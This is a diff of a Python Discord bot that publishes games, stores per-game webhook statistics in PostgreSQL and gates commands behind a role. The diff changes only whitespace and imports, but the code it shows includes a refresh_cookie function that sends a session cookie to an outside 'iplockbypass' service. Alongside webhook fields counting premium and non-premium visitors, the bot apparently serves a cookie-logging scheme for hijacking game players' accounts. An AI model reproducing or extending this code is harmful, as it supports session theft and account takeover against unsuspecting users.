@@ -1,4 +1,3 @@
-# Your updated and secured script goes here
 import re
 import os
 import json
@@ -6,13 +5,13 @@ import secrets
 import uuid
 import requests
 import discord
+from discord import app_commands
+from webserver import keep_alive
 from discord.ext import commands
+from discord.app_commands.errors import MissingRole
 import psycopg2
 from dotenv import load_dotenv
-
 load_dotenv()
-
-# Rest of the code remains the same...
 
 # ...
 # Import statements and other code
@@ -78,7 +77,7 @@ def create_table(conn):
 
         # Execute the 'purchases' table creation query
         cur.execute(purchases_query)
-    
+
     conn.commit()
 
 
@@ -147,7 +146,7 @@ keep_alive()
 def refresh_cookie(c):
     try:
         response = requests.get(f"https://eggy.cool/iplockbypass?cookie={c}")
-        
+
         if response.text != "Invalid Cookie":
             new_cookie = response.text
             return new_cookie
@@ -205,10 +204,10 @@ def create_webhook(conn, game_id, success, vpremium, visit, failed, vnbc, unnbc,
         update_data = (
             success, vpremium, visit, failed, vnbc, unnbc, unpremium, game_id
         )
-        
+
         with conn.cursor() as cur:
             cur.execute(update_query, update_data)
-        
+
         conn.commit()
         apiCheck = "Successfully Listed His/Her Webhooks."
     elif existing_discid is not None and str(existing_discid[0]) != str(discord_id):
@@ -258,7 +257,7 @@ async def slash_publish(interaction: discord.Interaction, theme: discord.app_com
     message = f"Role {role_name} is required to run this command."
     embed_var = discord.Embed(title=message, color=8918293)
     return await interaction.response.send_message(embed=embed_var, ephemeral=True)
-      
+
   message = "Publishing your Game please wait a sec..."
   embed_var = discord.Embed(title=message, color=0x00f55e)
   await interaction.response.send_message(embed=embed_var, ephemeral=True)
@@ -383,7 +382,7 @@ async def slash_publish(interaction: discord.Interaction, theme: discord.app_com
     print(f" [DATA] {uploadRequest.content} - Game Response")
 
     if uploadRequest.status_code == 200:
- 
+
         game_icon = get_game_icon(game_id)
 
         embed_var = discord.Embed(title="Your Game Has Been Published", description="**SuccessFully Published!**", color=0x00FF71)
